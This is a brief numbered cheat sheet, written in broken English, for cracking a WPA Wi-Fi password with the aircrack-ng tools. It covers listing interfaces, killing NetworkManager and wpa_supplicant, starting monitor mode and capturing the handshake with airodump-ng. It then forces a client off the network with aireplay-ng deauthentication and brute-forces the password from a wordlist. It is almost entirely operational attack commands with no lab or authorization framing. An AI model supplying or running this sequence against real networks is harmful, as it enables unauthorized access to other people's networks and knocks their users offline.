1. `#iwconfig`
find out the interface name of wireless

2. `#iwlist wlan0 scan`
scanning for nearby access points

3.  `#airmon-ng check`
check these running process that are interfering

4. `#airmon-ng check kill`
kill all process that are interfering 
NetworkManager
wpa_supplicant

5. `airmon-ng start wlan0`
switch to monitor mode

6. `airodump-ng -c <Channel Number> --bssid <AP MAC Address> -w <Writeout File> wlan0mon`
Channel Number, AP MAC Address are inside of the second command's output, wlan0mon is the interface name of wireless at monitor mode. using the command to capture fourth handshake, if hasn't handshake, to kicking a client to off the network and forcing it to reconnect, see below

7. `aireplay-ng -0 1 -a <AP MAC Address> -c <Client MAC Address> wlan0mon`
Client MAC Address is inside of the fifth command's output, -0 means deauthtication 1 is the number of deauthentication requests to send


After the sixth command was complemented, will be capture the fourth handshake packets(in .cap file, using 'eapol' to filter the handshake packets in wireshark)

final:
`aircrack-ng -w <Passwdlst> -b <AP MAC Address> WriteoutFile*.cap`
brute force password
